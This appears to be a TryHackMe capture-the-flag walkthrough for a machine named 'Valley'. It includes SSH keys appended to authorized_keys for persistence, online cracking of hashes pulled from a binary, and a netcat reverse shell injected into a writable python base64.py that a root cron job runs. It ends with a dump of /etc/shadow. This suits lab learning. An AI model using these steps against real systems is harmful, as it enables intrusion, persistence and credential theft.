### New Usable SSH Pub Keys

> add to ~/.ssh/authorized_keys


valleyDev

```
echo -e "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDM6yiQNtQ3507UuQUzym24oiFDO76MKsL2HdZDAoWiBeccRTPqxK2gVaJPzGQMfyzVfx3yUqxV0ucZ20R0t53LVop+hZ5S6xtGJOW5dQpZYDvjOuTbl9LzSQ07d2nQgjzZVJstMAsEi/VMNzcadH2ydg2hgu5ZLprIfiI6Phc40jZtco7XhJESiqGZkMQYC9sb4PBIgHxlHJUo3fdvTdRWvYSiyeiKi0mBPR8E9rLUFMas4iTgHt02t3g8INkK/BpFv7ZPBqXaVpU/v0ccL50QwL8sEvMkBnnFaiFhzNEZWW7XbQzWvpOnhQYx+/shLM4e6EEeQ071aMc9lgVkU53Ydm4QYKd6y/wED6oj6VYQ3J7O3u9S6c1F3XE0w4OtjDqVZ5DPiWl6GTVTAiVFMTKoLXNcRCBxRFLJSp//hZjDPQvb/db1fNIMoAtmZfEXMfEyB0ToTbTz0dnLg9+Dp8d9fLuRuKk00+68KBDB2Tdf54G53uRMy6OW39z56kuAslrMzvqy8wQtLIXSkPjfIKhzMPpaGWKiBUZoTwFW0sfsH6RYekhjo4Lzk1Y1IV7JG+sNgHWldh4w5WR0iZD3p+NFA49yew+x4ZgsXOuS3tfPC3Vhh4jfMhUjh7+ZKzOjg2rMlWYiFbrFJHqtzrWpywCgVAu4FRrfcEbLwR9mAIiIaw== your_email@example.com" >> /home/valleyDev/.ssh/authorized_keys

```

valley
```
echo -e "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDM6yiQNtQ3507UuQUzym24oiFDO76MKsL2HdZDAoWiBeccRTPqxK2gVaJPzGQMfyzVfx3yUqxV0ucZ20R0t53LVop+hZ5S6xtGJOW5dQpZYDvjOuTbl9LzSQ07d2nQgjzZVJstMAsEi/VMNzcadH2ydg2hgu5ZLprIfiI6Phc40jZtco7XhJESiqGZkMQYC9sb4PBIgHxlHJUo3fdvTdRWvYSiyeiKi0mBPR8E9rLUFMas4iTgHt02t3g8INkK/BpFv7ZPBqXaVpU/v0ccL50QwL8sEvMkBnnFaiFhzNEZWW7XbQzWvpOnhQYx+/shLM4e6EEeQ071aMc9lgVkU53Ydm4QYKd6y/wED6oj6VYQ3J7O3u9S6c1F3XE0w4OtjDqVZ5DPiWl6GTVTAiVFMTKoLXNcRCBxRFLJSp//hZjDPQvb/db1fNIMoAtmZfEXMfEyB0ToTbTz0dnLg9+Dp8d9fLuRuKk00+68KBDB2Tdf54G53uRMy6OW39z56kuAslrMzvqy8wQtLIXSkPjfIKhzMPpaGWKiBUZoTwFW0sfsH6RYekhjo4Lzk1Y1IV7JG+sNgHWldh4w5WR0iZD3p+NFA49yew+x4ZgsXOuS3tfPC3Vhh4jfMhUjh7+ZKzOjg2rMlWYiFbrFJHqtzrWpywCgVAu4FRrfcEbLwR9mAIiIaw== your_email@example.com" >> /home/valley/.ssh/authorized_keys
```


Root
```
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQC1TAjNCjKbSHodLHROp/HxlRGmKaJWhMAilEZ0S/0HSY8LhIv2M7YIu6NdtWhbUUbHFdOeIWSywzIb4PpYGpFmefvNlz67Dt4LGX9l5UsZZSVM9KkusiR9UOyR3vNgHMvD47p75JRbH1RdSjxRDwB2tKLGDRxHBv8kzY1BvoPKwt/K2mTg0xkz61MVJqzl6wvOiKWb0pxohqB+EnL1Va8HEc7eIJV9ddxeFk3gsWCeFvsq234BD+q0MhC5ejvJGfKhSWJFeFxttTjS4I6sPo0db/lb8/Q1zMWMkItU1Nv7aZIf31z8O9vl0x093z5QSuYWyOS06t0tdPwQuMlKY2tMOc/yEsuwZqahTaybpKwv0/3PNMCqJixbcliXvjxuButeCoBw+ynZxvlUygeUrX9Pd2hlaRCybywgntmNUt3a1cVll3iSkC2K5BGSd4zkd+CxAs1Cgy797Q/HqTjs/+FlmAmN+lCQZgGPjNged3eoFhTj+Uyr5EAPtLMKZZRGp4q15H7Pp71iJV5Gu42NUiho4UdR+h88qu3kVefq6RufeekJIcYO46DL6WN2hYl4RWcwqFm7+LHQuAp/tocC4IdjszHz5wl0S7IBFCTmF5X3wXAYQ1yPciPrLtTNLJEk36x21opj1aPxcHKHaFgMb8wc3GGccHTenfM1JEXGgcJmTw== your_email@example.com" >> /root/.ssh/authorized_keys
```


going back to the web login and attempting

http://10.10.144.208/dev1243224123123/

does not work - try ssh service?

```
ssh valleyDev@10.10.144.208
ph0t0s1234
```

auth successful

```
valleyDev@10.10.144.208's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-139-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

 * Introducing Expanded Security Maintenance for Applications.
   Receive updates to over 25,000 software packages with your
   Ubuntu Pro subscription. Free for personal use.

     https://ubuntu.com/pro
valleyDev@valley:~$ whoami
valleyDev
valleyDev@valley:~$ uname -a
Linux valley 5.4.0-139-generic #156-Ubuntu SMP Fri Jan 20 17:27:18 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
```

/home/valleyDev/user.txt

```
THM{k@l1_1n_th3_v@lley}
```

/etc/passwd

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:114::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:115::/nonexistent:/usr/sbin/nologin
avahi-autoipd:x:109:116:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin
usbmux:x:110:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
rtkit:x:111:117:RealtimeKit,,,:/proc:/usr/sbin/nologin
dnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
cups-pk-helper:x:113:120:user for cups-pk-helper service,,,:/home/cups-pk-helper:/usr/sbin/nologin
speech-dispatcher:x:114:29:Speech Dispatcher,,,:/run/speech-dispatcher:/bin/false
avahi:x:115:121:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin
kernoops:x:116:65534:Kernel Oops Tracking Daemon,,,:/:/usr/sbin/nologin
saned:x:117:123::/var/lib/saned:/usr/sbin/nologin
nm-openvpn:x:118:124:NetworkManager OpenVPN,,,:/var/lib/openvpn/chroot:/usr/sbin/nologin
hplip:x:119:7:HPLIP system user,,,:/run/hplip:/bin/false
whoopsie:x:120:125::/nonexistent:/bin/false
colord:x:121:126:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
geoclue:x:122:127::/var/lib/geoclue:/usr/sbin/nologin
pulse:x:123:128:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin
sssd:x:126:131:SSSD system user,,,:/var/lib/sss:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
tomcat:x:998:998::/opt/tomcat:/bin/false
sshd:x:127:65534::/run/sshd:/usr/sbin/nologin
valley:x:1000:1000:,,,:/home/valley:/bin/bash
siemDev:x:1001:1001::/home/siemDev/ftp:/bin/sh
valleyDev:x:1002:1002::/home/valleyDev:/bin/bash
ftp:x:128:135:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
fwupd-refresh:x:124:130:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
```

```
cat /etc/crontab
```


interesting cron job

```
1  *    * * *   root    python3 /photos/script/photosEncrypt.py
```


owned by root

```
-rwxr-xr-x 1 root root 621 Mar  6  2023 /photos/script/photosEncrypt.py
```


```
#!/usr/bin/python3
import base64
for i in range(1,7):
# specify the path to the image file you want to encode
        image_path = "/photos/p" + str(i) + ".jpg"

# open the image file and read its contents
        with open(image_path, "rb") as image_file:
          image_data = image_file.read()

# encode the image data in Base64 format
        encoded_image_data = base64.b64encode(image_data)

# specify the path to the output file
        output_path = "/photos/photoVault/p" + str(i) + ".enc"

# write the Base64-encoded image data to the output file
        with open(output_path, "wb") as output_file:
          output_file.write(encoded_image_data)
```

strange executable in /home

```
/home/valleyAuthenticator: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, no section header
```


```
scp -i valley_persis.rsa valleyDev@valley.thm:/home/valleyAuthenticator .

```

```
strings valleyAuthenticator
```

```
 -\(
UPX!
UPX!
```


```
upx -d valleyAuthenticator
```

```
Ultimate Packer for eXecutables
                          Copyright (C) 1996 - 2024
UPX 4.2.2       Markus Oberhumer, Laszlo Molnar & John Reiser    Jan 3rd 2024

        File size         Ratio      Format      Name
   --------------------   ------   -----------   -----------
   2290962 <-    749128   32.70%   linux/amd64   valleyAuthenticator

Unpacked 1 file.
```

grep for strings with  10 chars or more

```
strings valleyAuthenticator | grep -P '[\S]{10,}'
```

still not right, is there a password in there?

```
strings valleyAuthenticator | grep -i "pass" 
```


```
What is your password: 
Wrong Password or Username
```

yes, now lets give some context to it, print 20 lines before this occurence and the following 20 lines

```
strings valleyAuthenticator | grep -i "pass" -B 20 -A 20
```


```
]A\
I9\$xv.I
T$pH
tKU1
e6722920bab2326f8217e4bf6b1b58ac
dd2921cc76ee3abfd2beb60709056cfb
Welcome to Valley Inc. Authenticator
What is your username: 
What is your password: 
Authenticated
Wrong Password or Username
basic_string::_M_construct null not valid
%02x
basic_string::_M_construct null not valid
terminate called recursively
  what():  
terminate called after throwing an instance of '
terminate called without an active exception
basic_string::append
```

seems like a login attempt and these look like the credentials hashed

```
e6722920bab2326f8217e4bf6b1b58ac
dd2921cc76ee3abfd2beb60709056cfb
```


```
https://hashes.com/en/decrypt/hash
```


```
e6722920bab2326f8217e4bf6b1b58ac:liberty123
dd2921cc76ee3abfd2beb60709056cfb:valley
```

logging into the valley user

```
valleyDev@valley:/dev/shm$ whoami
valleyDev
valleyDev@valley:/dev/shm$ su valley
Password: 
valley@valley:/dev/shm$ whoami
valley
valley@valley:/dev/shm$ uname -a
Linux valley 5.4.0-139-generic #156-Ubuntu SMP Fri Jan 20 17:27:18 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
```

we are in the valleyAdmin group

```
uid=1000(valley) gid=1000(valley) groups=1000(valley),1003(valleyAdmin)
```


```
╔══════════╣ Executable files potentially added by user (limit 70)
2023-03-06+15:43:32.8105266440 /photos/script/photosEncrypt.py

```


```
-rwxr-xr-x 1 root root 621 Mar  6  2023 /photos/script/photosEncrypt.py
```

again looking at that script

```
import base64
...
# encode the image data in Base64 format
        encoded_image_data = base64.b64encode(image_data)
```


```
locate bas64
/usr/lib/python3.8/base64.py
```


we can write to this library file

```
-rwxrwxr-x 1 root valleyAdmin 20382 Mar 13  2023 /usr/lib/python3.8/base64.py
```

so how to take advantage

given the cronjob, photos script runs every minute by root user
the photos script uses bas64 library during encoding, specifically base64.b64encode()

given that we can modify bas64.py, we might be able to spawn a reverse shell

we have netcat on the system

```
which nc
/usr/bin/nc
```

our reverse shell using netcat that points back to our target machine

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.6.24.127 1337 >/tmp/f
```

we don't need to make a whole new library file. when the python library file is called, it is executed

we can inject python code into the library file to execute the reverse shell when the library file is loaded from the photos python script from the cronjob

the python code to inject

```
import os
os.system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.6.24.127 1337 >/tmp/f')
```

```
nano /usr/lib/python3.8/base64.py
```


![[pyinject.png]]

start a listener on attacker machine

```
nc -lvnp 1337
```

get a hit

```
listening on [any] 1337 ...
connect to [10.6.24.127] from (UNKNOWN) [10.10.144.208] 49624
sh: 0: can't access tty; job control turned off
# whoami 
root
# uname -a
Linux valley 5.4.0-139-generic #156-Ubuntu SMP Fri Jan 20 17:27:18 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
# sudo -l
Matching Defaults entries for root on valley:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User root may run the following commands on valley:
    (ALL : ALL) ALL
# 
```

/root/root.txt

```
THM{v@lley_0f_th3_sh@d0w_0f_pr1v3sc}
```


/etc/shadow

```
root:$6$fZFj0HVMgSFos0ip$YfOYlkrmWG1XYSfd/C3Hn9mdPcyZzErNFFFHbgqRBMXn09cRegpaP8kWB3iUGVlPiM/gejJt11dyVr4g1LXG31:19422:0:99999:7:::
daemon:*:19046:0:99999:7:::
bin:*:19046:0:99999:7:::
sys:*:19046:0:99999:7:::
sync:*:19046:0:99999:7:::
games:*:19046:0:99999:7:::
man:*:19046:0:99999:7:::
lp:*:19046:0:99999:7:::
mail:*:19046:0:99999:7:::
news:*:19046:0:99999:7:::
uucp:*:19046:0:99999:7:::
proxy:*:19046:0:99999:7:::
www-data:*:19046:0:99999:7:::
backup:*:19046:0:99999:7:::
list:*:19046:0:99999:7:::
irc:*:19046:0:99999:7:::
gnats:*:19046:0:99999:7:::
nobody:*:19046:0:99999:7:::
systemd-network:*:19046:0:99999:7:::
systemd-resolve:*:19046:0:99999:7:::
systemd-timesync:*:19046:0:99999:7:::
messagebus:*:19046:0:99999:7:::
syslog:*:19046:0:99999:7:::
_apt:*:19046:0:99999:7:::
tss:*:19046:0:99999:7:::
uuidd:*:19046:0:99999:7:::
tcpdump:*:19046:0:99999:7:::
avahi-autoipd:*:19046:0:99999:7:::
usbmux:*:19046:0:99999:7:::
rtkit:*:19046:0:99999:7:::
dnsmasq:*:19046:0:99999:7:::
cups-pk-helper:*:19046:0:99999:7:::
speech-dispatcher:!:19046:0:99999:7:::
avahi:*:19046:0:99999:7:::
kernoops:*:19046:0:99999:7:::
saned:*:19046:0:99999:7:::
nm-openvpn:*:19046:0:99999:7:::
hplip:*:19046:0:99999:7:::
whoopsie:*:19046:0:99999:7:::
colord:*:19046:0:99999:7:::
geoclue:*:19046:0:99999:7:::
pulse:*:19046:0:99999:7:::
sssd:*:19046:0:99999:7:::
systemd-coredump:!!:19215::::::
tomcat:!:19219::::::
sshd:*:19219:0:99999:7:::
valley:$6$CQTaujDFf5F8h01J$P/t5lFRO04rBSDX1LZjtJk8Z8hHgm04omNlGZNi7atNx8D9rdtWGhkO6ZIDbwRvWJ0S8PAbvcHIsSRuD5A8qY1:19219:0:99999:7:::
mysql:!:19419:0:99999:7:::
siemDev:$6$fR.iTZ50e43fvA54$BQhrVoEnsN7bnoQxtjZId2OKUMtT1iy7zoRUYysNwR8a5y.6YzVJpm3BnWgB9vaIySKamPVkvgsL85o13VCdv0:19423:0:99999:7:::
valleyDev:$6$zlXo7.3.SJ3kOpj7$LdnuI03rJA22PT2p7TCEH0PIk4olUT.RUpwuC4M10WIyuZNas1TDSEiWKfsfVYiPaUswMq7yUdwJYwdHpAhx31:19422:0:99999:7:::
ftp:*:19423:0:99999:7:::
fwupd-refresh:*:19436:0:99999:7:::
```